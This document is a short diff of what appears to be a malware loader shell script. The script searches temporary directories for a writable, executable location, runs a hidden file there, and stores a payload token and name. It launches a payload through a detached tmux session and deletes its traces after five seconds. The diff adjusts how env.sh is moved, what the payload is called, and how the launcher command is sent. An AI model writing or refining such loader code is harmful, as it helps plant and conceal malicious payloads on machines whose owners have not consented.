@@ -10,7 +10,7 @@ for ph in {/tmp,/dev/shm,/run,~/,/var/tmp,/var/cache}; do
         chmod +x $ph/.xtst &&
         $ph/.xtst &&
         rm -f $ph/.xtst &&
-        cd $ph &&
+        { mv env.sh $ph/ &>/dev/null; cd $ph; } &&
         break
 done
 { type base64 &>/dev/null && b64=base64; } ||
@@ -79,7 +79,7 @@ else
             endpoints_fallback
 fi
 
-export pl_token="${pl_token}" pl_name="${pl_name:-payload.zip}"
+export pl_token="${pl_token}" pl_name="${pl_name:-payload}"
 # echo "export \
 #     ">>env.sh
 
@@ -93,7 +93,7 @@ if [ "$TMX" = 1 ]; then
     tmux  setenv -g pl_name "$pl_name"
 
     tmux new -d -s crt
-    tmux send-keys -t crt "$launcher" Enter
+    tmux send-keys -t crt "$(printf '%s' "$launcher")" Enter
     (sleep 5 && rm -f env.sh "$filename") &>/dev/null &
 else
     (sleep 5 && rm -f env.sh "$filename") &>/dev/null &
